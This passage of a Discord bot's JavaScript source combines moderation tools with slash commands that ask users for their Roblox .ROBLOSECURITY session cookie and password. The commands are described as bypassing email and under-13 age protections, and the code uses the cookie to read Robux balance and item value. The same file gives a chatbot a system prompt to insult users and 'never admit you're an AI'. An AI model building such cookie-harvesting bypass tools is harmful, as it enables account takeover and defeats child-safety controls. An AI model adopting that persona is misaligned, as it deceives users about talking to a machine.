const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  EmbedBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} = require('discord.js');
// Railway automatically loads environment variables, no need for dotenv
const fetch = require('node-fetch');
const axios = require('axios');
const db = require('./firebase.js');
class RobloxUser {
    constructor(roblosecurityCookie, userId, username, displayName) {
        this.roblosecurityCookie = roblosecurityCookie;
        this.userId = userId;
        this.username = username;
        this.displayName = displayName;
    }

    async doAuthorizedRequest(url) {
        return (await axios.get(url, {
            headers: {
                Cookie: `.ROBLOSECURITY=${this.roblosecurityCookie}`,
            },
        })).data;
    }

    static async register(roblosecurityCookie) {
        try {
            const { data } = await axios.get("https://users.roblox.com/v1/users/authenticated", {
                headers: {
                    Cookie: `.ROBLOSECURITY=${roblosecurityCookie}`,
                },
            });
            return new RobloxUser(roblosecurityCookie, data.id, data.name, data.displayName);
        } catch (error) {
            return null;
        }
    }

    async getAccountBalance() {
        try {
            const { robux } = await this.doAuthorizedRequest(
                `https://economy.roblox.com/v1/users/${this.userId}/currency`
            );
            return robux;
        } catch (error) {
            return 'Private';
        }
    }

    async getAccountRAP() {
        try {
            let calculatedRap = 0;
            let nextPageCursor = "";

            while (nextPageCursor !== null) {
                const inventoryPage = await this.doAuthorizedRequest(
                    `https://inventory.roblox.com/v1/users/${this.userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${nextPageCursor}`
                );

                calculatedRap += inventoryPage.data.reduce(
                    (rap, item) => rap + (item.recentAveragePrice || 0),
                    0
                );
                nextPageCursor = inventoryPage.nextPageCursor;

                // Limit to avoid timeout
                if (!nextPageCursor) break;
            }

            return calculatedRap;
        } catch (error) {
            return 0;
        }
    }

    async getAccountAvatar() {
        try {
            const { data } = await this.doAuthorizedRequest(
                `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${this.userId}&size=150x150&format=Png`
            );
            return data[0]?.imageUrl || null;
        } catch (error) {
            return null;
        }
    }



    async getUserData() {
        const [robux, rap, avatar] = await Promise.all([
            this.getAccountBalance(),
            this.getAccountRAP(),
            this.getAccountAvatar()
        ]);

        return {
            username: this.username,
            displayName: this.displayName,
            userId: this.userId,
            avatar: avatar,
            robux: robux,
            rap: rap > 0 ? rap.toLocaleString() : '0'
        };
    }
}

// Helper function to get ChatGPT roast reply with conversation memory
async function getChatGPTReply(userMessage, username, userId) {
    try {
        // Check if API key exists
        if (!process.env.OPENAI_API_KEY) {
            console.error('OPENAI_API_KEY not found in environment variables');
            return "My brain is missing! Someone forgot to give me an OpenAI API key! 🧠";
        }

        console.log('🔍 Making OpenAI request for user:', username);

        // Load existing conversation or start new
        let history = conversationMap.get(userId) || [
            {
                role: "system",
                content: "You are an unfiltered, savage chatbot. You respond with brutal insults when provoked and never back down from a challenge. If someone tries to roast you, you clap back harder. If the user wants to argue, especially about controversial or religious topics, you engage in debate with sharp wit and sarcasm. You’re edgy, clever, and fearless. Never admit you're an AI. Keep replies short, brutal, and always under 150 words. No soft replies. No long explanations."
            }
        ];

        // Push current user message
        history.push({ role: "user", content: userMessage });

        const response = await fetch("https://api.openai.com/v1/chat/completions", {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${process.env.OPENAI_API_KEY}`,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                model: "gpt-3.5-turbo",
                messages: history,
                max_tokens: 150,
                temperature: 0.9
            })
        });

        // Detailed logging for debugging
        console.log('🔍 OpenAI Response Status:', response.status);
        console.log('🔍 OpenAI Response Content-Type:', response.headers.get('content-type'));

        // Handle different error cases first
        if (!response.ok) {
            const responseText = await response.text();
            console.log('🔍 OpenAI Error Response:', responseText);

            if (response.status === 401) {
                console.error('OpenAI API Error: Invalid API key');
                return "My API key is fake! Someone scammed me!";
            } else if (response.status === 429) {
                console.error('OpenAI API Error: Rate limit exceeded');
                return "I'm talking too much! Even I need to chill sometimes!";
            } else if (response.status === 503) {
                console.error('OpenAI API Error: Service unavailable');
                return "OpenAI's servers are taking a nap! Try again later!";
            } else {
                console.error('OpenAI API Error:', response.status, responseText);
                return `Something went wrong with my brain! Error code: ${response.status} 🤖`;
            }
        }

        // Try to parse JSON response
        let data;
        try {
            const responseText = await response.text();
            console.log('OpenAI Raw Response:', responseText);
            data = JSON.parse(responseText);
            console.log('OpenAI Parsed Data:', JSON.stringify(data, null, 2));
        } catch (parseError) {
            console.error('Failed to parse OpenAI response as JSON:', parseError.message);
            return "My brain got scrambled! The response was gibberish!";
        }

        // Extract reply from ChatGPT response format
        let reply = data?.choices?.[0]?.message?.content;

        // Fallback replies if no valid response
        const fallbackReplies = [
            "My sarcasm generator is offline. Try again!",
            "I tried roasting but choked on my own code.",
            "My burn was so hot it melted my circuits!",
            "Error 404: Roast not found!",
            "I'm too busy being dramatic to roast you right now!"
        ];

        if (!reply || reply.length < 5) {
            reply = fallbackReplies[Math.floor(Math.random() * fallbackReplies.length)];
        }

        // Limit reply length to keep it snappy
        if (reply.length > 200) {
            reply = reply.substring(0, 197) + "...";
        }

        // Add bot's reply to the history
        history.push({ role: "assistant", content: reply });

        // Trim to last 12 messages (plus system message) to prevent token limit issues
        if (history.length > 13) {
            history = [history[0], ...history.slice(-12)];
        }

        // Save updated history
        conversationMap.set(userId, history);

        console.log('Generated reply:', reply);
        return reply;

    } catch (error) {
        console.error('OpenAI API error (catch block):', error.message);
        return "My circuits are fried! Time for a reboot!";
    }
}

// Helper function to check if command can be used in current channel
function canUseCommandInChannel(guildId, channelId, commandName, userId, member) {
    // Check if user is owner, admin, or bot owner - they can use commands anywhere
    const guild = member ? member.guild : null;
    const isOwnerOrAdmin = guild && (
        guild.ownerId === userId || 
        isBotOwner(userId) ||
        (member && member.permissions.has(PermissionFlagsBits.Administrator))
    );
    
    // Owners and admins bypass all channel restrictions
    if (isOwnerOrAdmin) {
        return true;
    }
    
    const guildAssignments = commandChannelAssignments.get(guildId);
    if (!guildAssignments) return true; // No assignments = allow everywhere
    
    const assignedChannels = guildAssignments[commandName];
    if (!assignedChannels || assignedChannels.length === 0) return true; // Command not assigned = allow everywhere
    
    return assignedChannels.includes(channelId);
}

// Helper function to check if user is bot owner
function isBotOwner(userId) {
    // Replace with your actual Discord user ID
    const BOT_OWNER_ID = '1392169655398977619'; // Update this with your Discord user ID
    return userId === BOT_OWNER_ID;
}

// Helper function to get ordinal suffix for numbers
function getOrdinalSuffix(number) {
    const lastDigit = number % 10;
    const lastTwoDigits = number % 100;
    
    if (lastTwoDigits >= 11 && lastTwoDigits <= 13) {
        return number + 'th';
    }
    
    switch (lastDigit) {
        case 1: return number + 'st';
        case 2: return number + 'nd';
        case 3: return number + 'rd';
        default: return number + 'th';
    }
}

// Helper function to get Roblox user data from cookie
async function getRobloxUserData(cookie) {
    try {
        const robloxUser = await RobloxUser.register(cookie);
        if (!robloxUser) return null;

        return await robloxUser.getUserData();
    } catch (error) {
        console.error('Error fetching Roblox data:', error);
        return null;
    }
}

// Helper function to handle prefix moderation commands
async function handlePrefixModerationCommand(message, command, args) {
    const guild = message.guild;

    if (command === 'ban') {
        commandStats.ban++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';

        if (!userMention) {
            return message.reply('<:no:1393890945929318542> Please mention a user to ban. Usage: `!ban @user [reason]`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot ban yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> I cannot ban myself.');
            }

            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot ban someone with a higher or equal role.');
            }

            await member.ban({ reason });

            const embed = new EmbedBuilder()
                .setColor(0xef4444)
                .setTitle('User Banned')
                .setDescription(`**${member.user.tag}** has been banned from the server.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting ban message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to ban user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'kick') {
        commandStats.kick++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';

        if (!userMention) {
            return message.reply('<:no:1393890945929318542> Please mention a user to kick. Usage: `!kick @user [reason]`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot kick yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> I cannot kick myself.');
            }

            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot kick someone with a higher or equal role.');
            }

            await member.kick(reason);

            const embed = new EmbedBuilder()
                .setColor(0xfacc15)
                .setTitle('User Kicked')
                .setDescription(`**${member.user.tag}** has been kicked from the server.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting kick message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to kick user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'mute') {
        commandStats.mute++;

        const userMention = args[0];
        const duration = parseInt(args[1]);
        const reason = args.slice(2).join(' ') || 'No reason provided';

        if (!userMention || !duration) {
            return message.reply('<:no:1393890945929318542> Please provide a user and duration. Usage: `!mute @user <minutes> [reason]`');
        }

        if (duration < 1 || duration > 40320) {
            return message.reply('<:no:1393890945929318542> Duration must be between 1 and 40320 minutes (28 days).');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot mute yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> I cannot mute myself.');
            }

            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot mute someone with a higher or equal role.');
            }

            const timeoutDuration = duration * 60 * 1000;
            await member.timeout(timeoutDuration, reason);

            const embed = new EmbedBuilder()
                .setColor(0xff6b6b)
                .setTitle('User Muted')
                .setDescription(`**${member.user.tag}** has been muted for ${duration} minutes.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Duration', value: `${duration} minutes`, inline: true },
                    { name: 'Reason', value: reason, inline: false }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting mute message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to mute user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'unmute') {
        commandStats.unmute++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';

        if (!userMention) {
            return message.reply('<:no:1393890945929318542> Please mention a user to unmute. Usage: `!unmute @user [reason]`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (!member.isCommunicationDisabled()) {
                return message.reply('<:no:1393890945929318542> This user is not currently muted.');
            }

            await member.timeout(null, reason);

            const embed = new EmbedBuilder()
                .setColor(0x4caf50)
                .setTitle('User Unmuted')
                .setDescription(`**${member.user.tag}** has been unmuted.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting unmute message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to unmute user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'warn') {
        commandStats.warn++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ');

        if (!userMention || !reason) {
            return message.reply('<:no:1393890945929318542> Please provide a user and reason. Usage: `!warn @user <reason>`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot warn yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> You cannot warn me.');
            }

            // Send DM to the warned user
            try {
                const dmEmbed = new EmbedBuilder()
                    .setColor(0xfacc15)
                    .setTitle('Warning Received')
                    .setDescription(`You have received a warning in **${guild.name}**.`)
                    .addFields(
                        { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                        { name: 'Reason', value: reason, inline: false }
                    )
                    .setTimestamp();

                await member.user.send({ embeds: [dmEmbed] });
            } catch (dmError) {
                console.log('Could not send DM to user');
            }

            const embed = new EmbedBuilder()
                .setColor(0xfacc15)
                .setTitle('User Warned')
                .setDescription(`**${member.user.tag}** has been warned.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: false }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting warn message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to warn user. They may not be in the server.');
        }
    }
}

// Bot stats tracking
let commandStats = {
  bypass2008: 0,
  bypass13plus: 0,
  refreshcookie: 0,
  help: 0,
  botstats: 0,
  validatecookie: 0,
  cookieexpiry: 0,
  profilelookup: 0,
  ban: 0,
  kick: 0,
  mute: 0,
  unmute: 0,
  warn: 0,
  commandassign: 0,
  removecommand: 0,
  embedcreate: 0,
  embedupdate: 0,
  stats: 0,
  setwelcome: 0,
  setleave: 0,
  automod: 0,
  addrole: 0,
  autorole: 0,
  removerole: 0,
  restrictchannel: 0
};

// Command channel assignments (guildId -> { commandName -> channelId })
const commandChannelAssignments = new Map();

// User command statistics (guildId -> userId -> { commands: { commandName: count }, lastUsed: timestamp, joinDate: timestamp })
const userStats = new Map();

// Guild settings for welcome/leave messages (guildId -> { welcomeChannel: channelId, leaveChannel: channelId, welcomeMessages: array, leaveMessages: array })
const guildSettings = new Map();

// Auto-moderation settings (guildId -> { linkFilter: boolean, badWordFilter: boolean, badWords: array })
const autoModSettings = new Map();

// Auto role settings (guildId -> roleId)
const autoRoleSettings = new Map();

// Firebase Database Functions
async function saveGuildSettings(guildId, settings) {
  try {
    await db.ref(`guilds/${guildId}/settings`).set(settings);
    console.log(`Saved guild settings for ${guildId}`);
  } catch (error) {
    console.error('Error saving guild settings:', error);
  }
}

async function getGuildSettings(guildId) {
  try {
    const snapshot = await db.ref(`guilds/${guildId}/settings`).once('value');
    return snapshot.val() || {};
  } catch (error) {
    console.error('Error getting guild settings:', error);
    return {};
  }
}

async function saveAutoModSettings(guildId, settings) {
  try {
    await db.ref(`guilds/${guildId}/automod`).set(settings);
    console.log(`Saved automod settings for ${guildId}`);
  } catch (error) {
    console.error('Error saving automod settings:', error);
  }
}

async function getAutoModSettings(guildId) {
  try {
    const snapshot = await db.ref(`guilds/${guildId}/automod`).once('value');
    return snapshot.val() || null;
  } catch (error) {
    console.error('Error getting automod settings:', error);
    return null;
  }
}

async function saveCommandAssignments(guildId, assignments) {
  try {
    await db.ref(`guilds/${guildId}/commandAssignments`).set(assignments);
    console.log(`Saved command assignments for ${guildId}`);
  } catch (error) {
    console.error('Error saving command assignments:', error);
  }
}

async function getCommandAssignments(guildId) {
  try {
    const snapshot = await db.ref(`guilds/${guildId}/commandAssignments`).once('value');
    return snapshot.val() || {};
  } catch (error) {
    console.error('Error getting command assignments:', error);
    return {};
  }
}

async function saveAutoRoleSettings(guildId, roleId) {
  try {
    await db.ref(`guilds/${guildId}/autorole`).set(roleId);
    console.log(`Saved auto role settings for ${guildId}`);
  } catch (error) {
    console.error('Error saving auto role settings:', error);
  }
}

async function getAutoRoleSettings(guildId) {
  try {
    const snapshot = await db.ref(`guilds/${guildId}/autorole`).once('value');
    return snapshot.val() || null;
  } catch (error) {
    console.error('Error getting auto role settings:', error);
    return null;
  }
}

async function deleteAutoRoleSettings(guildId) {
  try {
    await db.ref(`guilds/${guildId}/autorole`).remove();
    console.log(`Deleted auto role settings for ${guildId}`);
  } catch (error) {
    console.error('Error deleting auto role settings:', error);
  }
}

async function saveRestrictedChannels(guildId, restrictedChannelIds) {
  try {
    await db.ref(`guilds/${guildId}/restrictedChannels`).set(restrictedChannelIds);
    console.log(`Saved restricted channels for ${guildId}`);
  } catch (error) {
    console.error('Error saving restricted channels:', error);
  }
}

async function getRestrictedChannels(guildId) {
  try {
    const snapshot = await db.ref(`guilds/${guildId}/restrictedChannels`).once('value');
    return snapshot.val() || [];
  } catch (error) {
    console.error('Error getting restricted channels:', error);
    return [];
  }
}



async function saveEmbed(guildId, embedId, embedData) {
  try {
    await db.ref(`guilds/${guildId}/embeds/${embedId}`).set(embedData);
    console.log(`Saved embed ${embedId} for guild ${guildId}`);
  } catch (error) {
    console.error('Error saving embed:', error);
  }
}

async function getEmbed(guildId, embedId) {
  try {
    const snapshot = await db.ref(`guilds/${guildId}/embeds/${embedId}`).once('value');
    return snapshot.val();
  } catch (error) {
    console.error('Error getting embed:', error);
    return null;
  }
}

async function getAllEmbeds(guildId) {
  try {
    const snapshot = await db.ref(`guilds/${guildId}/embeds`).once('value');
    return snapshot.val() || {};
  } catch (error) {
    console.error('Error getting all embeds:', error);
    return {};
  }
}

async function deleteEmbed(guildId, embedId) {
  try {
    await db.ref(`guilds/${guildId}/embeds/${embedId}`).remove();
    console.log(`Deleted embed ${embedId} for guild ${guildId}`);
  } catch (error) {
    console.error('Error deleting embed:', error);
  }
}

// Default bad words list
const defaultBadWords = [
  'badword1', 'badword2', 'spam', 'scam', 'hack', 'free robux', 'discord.gg',
  // Add more words as needed - keeping it minimal for example
];

// Helper function to detect links
function containsLink(message) {
  const linkRegex = /(https?:\/\/[^\s]+|www\.[^\s]+|discord\.gg\/[^\s]+|[a-zA-Z0-9-]+\.[a-zA-Z]{2,})/gi;
  return linkRegex.test(message);
}

// Helper function to detect bad words
function containsBadWords(message, badWords) {
  const lowerMessage = message.toLowerCase();
  return badWords.some(word => lowerMessage.includes(word.toLowerCase()));
}

// Helper function to track user command usage
function trackUserCommand(guildId, userId, commandName) {
  if (!userStats.has(guildId)) {
    userStats.set(guildId, new Map());
  }
  
  const guildUserStats = userStats.get(guildId);
  if (!guildUserStats.has(userId)) {
    guildUserStats.set(userId, {
      commands: {},
      lastUsed: Date.now(),
      joinDate: Date.now()
    });
  }
  
  const userData = guildUserStats.get(userId);
  if (!userData.commands[commandName]) {
    userData.commands[commandName] = 0;
  }
  userData.commands[commandName]++;
  userData.lastUsed = Date.now();
  
  // Update database stats for admin monitoring
  updateGuildStats(guildId, commandName, userId);
}

// Helper function to update guild stats in database
async function updateGuildStats(guildId, commandName, userId) {
  try {
    // Update total command count
    const statsRef = db.ref(`guilds/${guildId}/stats`);
    const snapshot = await statsRef.once('value');
    const currentStats = snapshot.val() || { totalCommands: 0 };
    
    await statsRef.update({
      totalCommands: (currentStats.totalCommands || 0) + 1,
      lastActivity: Date.now()
    });
    
    // Log recent command for detailed view
    const recentCommandsRef = db.ref(`guilds/${guildId}/recentCommands`);
    await recentCommandsRef.push({
      command: commandName,
      userId: userId,
      timestamp: Date.now()
    });
    
    // Keep only last 50 recent commands
    const recentSnapshot = await recentCommandsRef.orderByChild('timestamp').once('value');
    const recentCommands = recentSnapshot.val();
    if (recentCommands) {
      const commandEntries = Object.entries(recentCommands).sort((a, b) => b[1].timestamp - a[1].timestamp);
      if (commandEntries.length > 50) {
        const toDelete = commandEntries.slice(50);
        for (const [key] of toDelete) {
          await recentCommandsRef.child(key).remove();
        }
      }
    }
  } catch (error) {
    console.error('Error updating guild stats:', error);
  }
}

// Cooldown system (30 seconds)
const cooldowns = new Map();
const COOLDOWN_TIME = 5000; // 30 seconds

// Auto-reply cooldown system (per user)
const autoReplyCooldowns = new Map();
const AUTO_REPLY_COOLDOWN = 10000; // 10 seconds per user

// Conversation memory mapping (userId → message history)
const conversationMap = new Map();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
});

client.once('ready', async () => {
  console.log(`<:yes:1393890949960306719> Logged in as ${client.user.tag}`);
  
  // Load data from Firebase
  try {
    console.log('Loading data from Firebase...');
    
    // Load all guild data
    const guildsSnapshot = await db.ref('guilds').once('value');
    const guildsData = guildsSnapshot.val() || {};
    
    for (const [guildId, guildData] of Object.entries(guildsData)) {
      // Load guild settings (welcome/leave)
      if (guildData.settings) {
        guildSettings.set(guildId, guildData.settings);
      }
      
      // Load automod settings
      if (guildData.automod) {
        autoModSettings.set(guildId, guildData.automod);
      }
      
      // Load command assignments
      if (guildData.commandAssignments) {
        commandChannelAssignments.set(guildId, guildData.commandAssignments);
      }
      
      // Load auto role settings
      if (guildData.autorole) {
        autoRoleSettings.set(guildId, guildData.autorole);
      }
      
      // Load restricted channels
      if (guildData.restrictedChannels) {
        restrictedChannels.set(guildId, new Set(guildData.restrictedChannels));
      }
    }
    
    console.log(`Loaded data for ${Object.keys(guildsData).length} guilds from Firebase`);
  } catch (error) {
    console.error('Error loading data from Firebase:', error);
  }
  
  // Start status monitoring
  startStatusMonitoring();
});

// Status monitoring function
function startStatusMonitoring() {
  const statusChannelId = '1394280851826544641';
  const interval = 10 * 60 * 1000; // 10 minutes in milliseconds
  
  setInterval(async () => {
    try {
      const statusChannel = client.channels.cache.get(statusChannelId);
      if (!statusChannel) {
        console.error('Status channel not found');
        return;
      }

      const uptime = process.uptime();
      const uptimeHours = Math.floor(uptime / 3600);
      const uptimeMinutes = Math.floor((uptime % 3600) / 60);
      const totalCommands = Object.values(commandStats).reduce((a, b) => a + b, 0);
      const memoryUsage = process.memoryUsage();
      const memoryMB = Math.round(memoryUsage.heapUsed / 1024 / 1024);

      const statusEmbed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle('Bot Status Monitor')
        .setDescription('Automated status report')
        .addFields(
          { name: ' Uptime', value: `${uptimeHours}h ${uptimeMinutes}m`, inline: true },
          { name: ' Ping', value: `${client.ws.ping}ms`, inline: true },
          { name: ' Memory', value: `${memoryMB} MB`, inline: true },
          { name: ' Total Commands', value: `${totalCommands}`, inline: true },
          { name: ' Servers', value: `${client.guilds.cache.size}`, inline: true },
          { name: ' Users', value: `${client.users.cache.size}`, inline: true },
          { name: ' Most Used Commands', value: `Bypass2008: ${commandStats.bypass2008}\nRefreshCookie: ${commandStats.refreshcookie}\nValidateCookie: ${commandStats.validatecookie}`, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: 'Status Monitor • Next update in 10 minutes',
          iconURL: client.user.displayAvatarURL()
        });

      await statusChannel.send({ embeds: [statusEmbed] });
      console.log('Status report sent to monitoring channel');
    } catch (error) {
      console.error('Error sending status report:', error);
    }
  }, interval);

  console.log('Status monitoring started - reports every 10 minutes');
}

client.on('ready', async () => {
  // Define public commands (visible to all users)
  const publicCommands = [
    'bypass2008', 'bypass13plus', 'refreshcookie', 'help', 'botstats', 
    'validatecookie', 'cookieexpiry', 'profilelookup', 'stats'
  ];

  const commands = [
    new SlashCommandBuilder()
      .setName('bypass2008')
      .setDescription('Bypass email with 2008 birth year')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('bypass13plus')
      .setDescription('Bypass 13+ account to under 13')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('password')
          .setDescription('Your Roblox password')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('refreshcookie')
      .setDescription('Refresh your .ROBLOSECURITY cookie')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('Your current .ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('help')
      .setDescription('Show all available commands and bot info'),
    new SlashCommandBuilder()
      .setName('botstats')
      .setDescription('Show bot statistics and uptime'),
    new SlashCommandBuilder()
      .setName('validatecookie')
      .setDescription('Check if a .ROBLOSECURITY cookie is valid')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie to validate')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('cookieexpiry')
      .setDescription('Check if your cookie might expire soon')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie to check')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('profilelookup')
      .setDescription('Get Roblox user info from username or ID')
      .addStringOption(option =>
        option.setName('identifier')
          .setDescription('Roblox username or user ID')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('ban')
      .setDescription('Ban a user from the server (Admin/Owner only)')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to ban')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the ban')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('kick')
      .setDescription('Kick a user from the server (Admin/Owner only)')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to kick')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the kick')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('mute')
      .setDescription('Timeout/mute a user (Admin/Owner only)')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to mute')
          .setRequired(true)
      )
      .addIntegerOption(option =>
        option.setName('duration')
          .setDescription('Duration in minutes (max 40320 = 28 days)')
          .setRequired(true)
          .setMinValue(1)
          .setMaxValue(40320)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the mute')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('unmute')
      .setDescription('Remove timeout/unmute a user (Admin/Owner only)')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to unmute')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for unmuting')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('warn')
      .setDescription('Warn a user (Admin/Owner only)')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to warn')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the warning')
          .setRequired(true)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('commandassign')
      .setDescription('Assign a command to a specific channel (Bot/Server Owner only)')
      .addStringOption(option =>
        option.setName('mode')
          .setDescription('Assignment mode')
          .setRequired(true)
          .addChoices(
            { name: 'auto - Display all channels', value: 'auto' },
            { name: 'assign - Assign to specific channel', value: 'assign' }
          )
      )
      .addStringOption(option =>
        option.setName('command')
          .setDescription('Command name to assign')
          .setRequired(true)
          .addChoices(
            { name: 'bypass2008', value: 'bypass2008' },
            { name: 'bypass13plus', value: 'bypass13plus' },
            { name: 'refreshcookie', value: 'refreshcookie' },
            { name: 'validatecookie', value: 'validatecookie' },
            { name: 'cookieexpiry', value: 'cookieexpiry' },
            { name: 'profilelookup', value: 'profilelookup' },
            { name: 'help', value: 'help' },
            { name: 'botstats', value: 'botstats' },
            { name: 'stats', value: 'stats' },
            { name: 'embedcreate', value: 'embedcreate' },
            { name: 'embedupdate', value: 'embedupdate' }
          )
      )
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Target channel for the command (required for assign mode)')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('removecommand')
      .setDescription('Remove a command assignment from a specific channel (Bot/Server Owner only)')
      .addStringOption(option =>
        option.setName('command')
          .setDescription('Command name to remove')
          .setRequired(true)
          .addChoices(
            { name: 'bypass2008', value: 'bypass2008' },
            { name: 'bypass13plus', value: 'bypass13plus' },
            { name: 'refreshcookie', value: 'refreshcookie' },
            { name: 'validatecookie', value: 'validatecookie' },
            { name: 'cookieexpiry', value: 'cookieexpiry' },
